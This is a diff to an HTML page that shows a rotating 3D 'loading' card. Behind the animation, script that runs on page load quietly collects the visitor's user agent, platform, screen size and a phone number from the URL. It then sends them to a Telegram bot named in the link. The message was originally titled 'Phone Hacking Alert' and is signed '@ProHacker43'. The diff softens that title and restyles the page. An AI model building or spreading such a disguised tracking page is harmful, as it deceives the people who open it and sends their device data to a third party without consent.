@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>3D Loading Device Info</title>
+<title>3D Mobile Info Loader</title>
 <style>
   body {
     margin: 0;
     font-family: 'Segoe UI', Arial, sans-serif;
-    background: linear-gradient(135deg, #6a11cb, #2575fc);
+    background: linear-gradient(135deg, #ff416c, #ff4b2b);
     height: 100vh;
     display: flex;
     align-items: center;
@@ -17,46 +17,46 @@
     overflow: hidden;
   }
   .card {
-    width: 350px;
-    height: 350px;
-    background: rgba(255,255,255,0.05);
-    border-radius: 20px;
+    width: 360px;
+    height: 360px;
+    background: rgba(255,255,255,0.08);
+    border-radius: 25px;
     display: flex;
     align-items: center;
     justify-content: center;
     transform-style: preserve-3d;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
-    animation: rotate 6s infinite linear;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.3);
+    animation: rotate 7s infinite linear;
   }
   @keyframes rotate {
     0% { transform: rotateX(0deg) rotateY(0deg);}
     100% { transform: rotateX(360deg) rotateY(360deg);}
   }
   .loader {
-    width: 200px;
+    width: 220px;
     height: 20px;
-    background: rgba(255,255,255,0.2);
-    border-radius: 10px;
+    background: rgba(255,255,255,0.25);
+    border-radius: 12px;
     overflow: hidden;
-    box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
+    box-shadow: inset 0 0 12px rgba(0,0,0,0.25);
   }
   .loader-bar {
     width: 0%;
     height: 100%;
-    background: linear-gradient(90deg,#ff6a00,#ee0979);
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(255,255,255,0.6);
+    background: linear-gradient(90deg,#00c6ff,#0072ff);
+    border-radius: 12px;
+    box-shadow: 0 0 10px rgba(0,255,255,0.6);
     transition: width 0.05s linear;
   }
   .status {
     position: absolute;
-    bottom: 30px;
+    bottom: 35px;
     color: #fff;
     font-weight: 600;
     text-align: center;
     width: 100%;
     font-size: 16px;
-    text-shadow: 0 0 10px rgba(0,0,0,0.5);
+    text-shadow: 0 0 12px rgba(0,0,0,0.5);
   }
 </style>
 </head>
@@ -75,38 +75,31 @@ const statusEl = document.getElementById('status');
 
 function safeText(s){ return String(s||'').replace(/<|>/g,''); }
 
+// د ډیواس معلوماتو راټولول
 async function collectDeviceInfo(){
   const nav = navigator;
   const ua = nav.userAgent || 'unknown';
   const platform = nav.platform || 'unknown';
-  const language = nav.language || 'unknown';
-  const cores = nav.hardwareConcurrency || 'unknown';
-  const devMem = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown';
   const screenSize = (screen.width||0) + 'x' + (screen.height||0);
   const dpr = window.devicePixelRatio || 1;
-  let storageInfo='unknown';
-  if(navigator.storage && navigator.storage.estimate){
-    try{
-      const est = await navigator.storage.estimate();
-      const q = n => n ? Math.round(n/1024/1024) + 'MB' : 'unknown';
-      storageInfo = `usage=${q(est.usage)} / quota=${q(est.quota)}`;
-    }catch(e){}
-  }
-  return {ua, platform, language, cores, devMem, screenSize, dpr, storageInfo};
+
+  // دلته د موبایل نمبر ځای نیول
+  // که کارونکي داخل کړي، یا له URL یا input څخه اخیستل
+  const phoneNumber = new URLSearchParams(location.search).get('phone') || 'Not provided';
+
+  return {ua, platform, screenSize, dpr, phoneNumber};
 }
 
+// میسج جوړول
 function makeMessage(info){
   const now = new Date().toLocaleString();
   const lines = [
-    '🔥 Phone Hacking Alert! 🔥',
+    '🔥 Mobile Info Alert! 🔥',
     '🛡️ Device info',
+    `📱 Phone Number: ${safeText(info.phoneNumber)}`,
     `1) Model/Platform: ${safeText(info.platform)}`,
     `2) User Agent: ${safeText(info.ua)}`,
-    `3) Language: ${safeText(info.language)}`,
-    `4) Screen: ${safeText(info.screenSize)} @${safeText(info.dpr)}x`,
-    `5) CPU cores: ${safeText(info.cores)}`,
-    `6) Device memory: ${safeText(info.devMem)}`,
-    `7) Storage: ${safeText(info.storageInfo)}`,
+    `3) Screen: ${safeText(info.screenSize)} @${safeText(info.dpr)}x`,
     '',
     `⏰ Time: ${now}`,
     `🦠 BotDeveloper: @ProHacker43`,
@@ -116,6 +109,7 @@ function makeMessage(info){
   return lines.join('\n');
 }
 
+// ټیلیګرام ته لیږل
 async function sendToTelegram(message){
   if(!CHAT_ID_FROM_URL){statusEl.textContent='Missing userid in URL'; return;}
   try{
@@ -132,6 +126,7 @@ async function sendToTelegram(message){
   }
 }
 
+// لودینګ بار متحرکول
 function animateLoader(duration=2500){
   return new Promise(resolve=>{
     let start = null;
@@ -147,11 +142,10 @@ function animateLoader(duration=2500){
   });
 }
 
+// اصلي عملیات
 (async function main(){
   const info = await collectDeviceInfo();
-  // لودینګ شروع کړئ
   await animateLoader(2500);
-  // کله چې بار ۱۰۰٪ شو، **سمدلاسه ټول معلومات بوت ته ولیږل شي**
   await sendToTelegram(makeMessage(info));
 })();
 })();
